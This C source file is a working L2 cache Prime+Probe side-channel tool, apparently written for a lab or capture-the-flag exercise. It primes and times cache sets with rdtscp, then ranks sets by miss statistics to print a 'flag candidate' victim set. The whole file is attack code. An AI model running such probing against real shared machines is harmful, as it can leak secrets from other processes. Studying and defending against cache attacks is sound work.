#include "util.h"
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

static inline double my_sqrt(double x)
{
    if (x <= 0.0) return 0.0;
    double r = x;
    for (int i = 0; i < 64; i++) r = 0.5 * (r + x / r);
    return r;
}

#define LINE_SIZE 64
#define L2_SETS   1024
#define L2_WAYS   16
#define SET_SPAN  (L2_SETS * LINE_SIZE)
#define BUFF_SIZE (SET_SPAN * L2_WAYS)

#define REPORT_INTERVAL_CYCLES 600000000ULL
#define MISS_THRESHOLD_CYCLES  80ULL

#define RATIO_MIN      20ULL
#define RATIO_MAX      250ULL

// How many sets either side to check for co-appearance (buffer self-collisions
// tend to be consecutive or fixed-stride sets that always appear together).
#define NEIGHBOR_WINDOW  4

// Score = appearances * APPEAR_WEIGHT
//       - ratio_stddev * RATIO_STDDEV_W
//       - neighbor_score * NEIGHBOR_W
// neighbor_score = sum of appearances of sets within NEIGHBOR_WINDOW of this set.
// A lone victim set has low neighbor_score; buffer aliases cluster together.
#define APPEAR_WEIGHT   10.0
#define RATIO_STDDEV_W   1.0
#define NEIGHBOR_W       0.5

static inline uint64_t now_cycles(void)
{
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void prime_set(void *buf, int set)
{
    volatile char tmp;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        tmp = *((volatile char *)buf + off);
    }
    (void)tmp;
}

static inline uint64_t probe_set(void *buf, int set, int *miss_count_out)
{
    uint64_t total = 0;
    int misses = 0;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        uint64_t t = measure_one_block_access_time((uint64_t)((char *)buf + off));
        total += t;
        if (t > MISS_THRESHOLD_CYCLES) misses++;
    }
    *miss_count_out = misses;
    return total;
}

int main(int argc, char **argv)
{
    void *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);
    if (buf == (void *)-1) { perror("mmap"); exit(1); }

    for (size_t i = 0; i < BUFF_SIZE; i += LINE_SIZE)
        *((volatile char *)buf + i) = 1;

    printf("Buffer at %p. Press Enter to start probing...\n", buf);
    { char tmp[2]; fgets(tmp, sizeof(tmp), stdin); }

    uint64_t *accum       = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *count       = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *misses      = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *appearances = calloc(L2_SETS, sizeof(uint64_t));
    // Welford — per-epoch cyc/miss ratio
    double   *ratio_mean  = calloc(L2_SETS, sizeof(double));
    double   *ratio_M2    = calloc(L2_SETS, sizeof(double));
    uint64_t *epoch_n     = calloc(L2_SETS, sizeof(uint64_t));
    if (!accum || !count || !misses || !appearances ||
        !ratio_mean || !ratio_M2 || !epoch_n)
        { perror("calloc"); exit(1); }

    uint64_t next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
    int epoch = 0;

    while (1) {
        for (int set = 0; set < L2_SETS; set++) {
            prime_set(buf, set);
            uint64_t wait = now_cycles() + 20000ULL;
            while (now_cycles() < wait) asm volatile("lfence" ::: "memory");

            int mc = 0;
            accum[set]  += probe_set(buf, set, &mc);
            misses[set] += (uint64_t)mc;
            count[set]++;
        }

        if (now_cycles() >= next_report) {
            epoch++;
            printf("\n=== Epoch %d — top 20 hottest sets (ratio band [%llu, %llu]) ===\n",
                   epoch, RATIO_MIN, RATIO_MAX);
            printf("%-6s  %-14s  %-12s  %-10s\n",
                   "set", "avg_probe_cyc", "miss_ways", "cyc/miss");

            int      top_sets[20];
            uint64_t top_avgs[20];
            uint64_t top_misses[20];
            uint64_t top_ratios[20];
            int top_n = 0;

            for (int rank = 0; rank < 20; rank++) {
                int best = -1;
                uint64_t best_avg = 0;
                for (int s = 0; s < L2_SETS; s++) {
                    if (count[s] == 0 || misses[s] == 0) continue;
                    uint64_t avg   = accum[s] / count[s];
                    uint64_t mways = misses[s];
                    uint64_t ratio = avg / mways;
                    if (ratio < RATIO_MIN || ratio > RATIO_MAX) continue;
                    if (avg > best_avg) { best_avg = avg; best = s; }
                }
                if (best < 0) break;

                top_sets[top_n]   = best;
                top_avgs[top_n]   = accum[best] / count[best];
                top_misses[top_n] = misses[best];
                top_ratios[top_n] = top_misses[top_n] > 0
                                    ? top_avgs[top_n] / top_misses[top_n] : 0;
                top_n++;

                printf("%-6d  %-14lu  %-12lu  %-10lu\n",
                       best, top_avgs[top_n-1], top_misses[top_n-1], top_ratios[top_n-1]);

                appearances[best]++;

                // Welford update — cyc/miss ratio
                double rv = (double)top_ratios[top_n-1];
                epoch_n[best]++;
                double rd = rv - ratio_mean[best];
                ratio_mean[best] += rd / (double)epoch_n[best];
                ratio_M2[best]   += rd * (rv - ratio_mean[best]);

                accum[best] = 0; count[best] = 0;
            }

            // Leaderboard: top 5 by composite score
            // neighbor_score penalizes sets whose adjacent sets also appear frequently
            // (buffer aliases always cluster; victim is isolated)
            printf("\n--- Leaderboard: top 5 by stability score ---\n");
            printf("%-5s  %-6s  %-14s  %-12s  %-10s  %-12s  %-10s\n",
                   "rank", "set", "appearances", "ratio_mean", "ratio_sd",
                   "neighbor_app", "score");

            double scores[L2_SETS];
            for (int s = 0; s < L2_SETS; s++) {
                if (appearances[s] == 0) { scores[s] = -1e18; continue; }
                double n = (double)epoch_n[s];
                double ratio_sd = n > 1 ? my_sqrt(ratio_M2[s] / (n - 1)) : 0.0;

                // Sum appearances of neighboring sets within NEIGHBOR_WINDOW
                uint64_t neighbor_app = 0;
                for (int d = -NEIGHBOR_WINDOW; d <= NEIGHBOR_WINDOW; d++) {
                    if (d == 0) continue;
                    int nb = s + d;
                    if (nb < 0 || nb >= L2_SETS) continue;
                    neighbor_app += appearances[nb];
                }

                scores[s] = (double)appearances[s] * APPEAR_WEIGHT
                           - ratio_sd * RATIO_STDDEV_W
                           - (double)neighbor_app * NEIGHBOR_W;
            }

            int candidate_set = -1;
            double scores_copy[L2_SETS];
            memcpy(scores_copy, scores, L2_SETS * sizeof(double));

            for (int rank = 1; rank <= 5; rank++) {
                int best_set = -1;
                double best_score = -1e18;
                for (int s = 0; s < L2_SETS; s++) {
                    if (scores_copy[s] > best_score) {
                        best_score = scores_copy[s];
                        best_set = s;
                    }
                }
                if (best_set < 0 || appearances[best_set] == 0) break;
                if (rank == 1) candidate_set = best_set;

                double n = (double)epoch_n[best_set];
                double ratio_sd = n > 1 ? my_sqrt(ratio_M2[best_set] / (n - 1)) : 0.0;
                uint64_t neighbor_app = 0;
                for (int d = -NEIGHBOR_WINDOW; d <= NEIGHBOR_WINDOW; d++) {
                    if (d == 0) continue;
                    int nb = best_set + d;
                    if (nb < 0 || nb >= L2_SETS) continue;
                    neighbor_app += appearances[nb];
                }
                printf("#%-4d  %-6d  %-14lu  %-12.1f  %-10.1f  %-12lu  %-10.1f\n",
                       rank, best_set, appearances[best_set],
                       ratio_mean[best_set], ratio_sd, neighbor_app, best_score);
                scores_copy[best_set] = -1e18;
            }

            if (top_n == 0)
                printf("(no sets qualified within ratio band)\n");
            else if (candidate_set >= 0)
                printf("\n>>> Flag candidate: set %d\n", candidate_set);

            printf("-------------------------------------------------\n");

            memset(accum,  0, L2_SETS * sizeof(uint64_t));
            memset(count,  0, L2_SETS * sizeof(uint64_t));
            memset(misses, 0, L2_SETS * sizeof(uint64_t));
            fflush(stdout);
            next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
        }
    }

    return 0;
}